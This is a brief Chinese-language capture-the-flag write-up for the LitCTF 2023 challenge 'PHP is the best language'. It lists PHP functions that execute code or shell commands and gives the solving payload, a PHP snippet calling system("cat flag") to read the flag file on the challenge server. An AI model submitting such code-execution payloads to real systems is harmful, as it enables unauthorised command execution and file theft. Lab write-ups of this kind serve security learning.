# [LitCTF 2023]PHP是世界上最好的语言

eval(): 执行字符串中的 PHP 代码。例如：eval('$x = 5;'); 会设置变量 $x 的值为 5。

assert(): 用于调试，检查一个条件是否为 true。

system(), shell_exec(), exec(), passthru(): 执行外部程序或系统命令。例如：system("ls"); 会执行 ls 命令并显示输出。

直接执行即可

``` php
<?php
system("cat flag");
?>
```
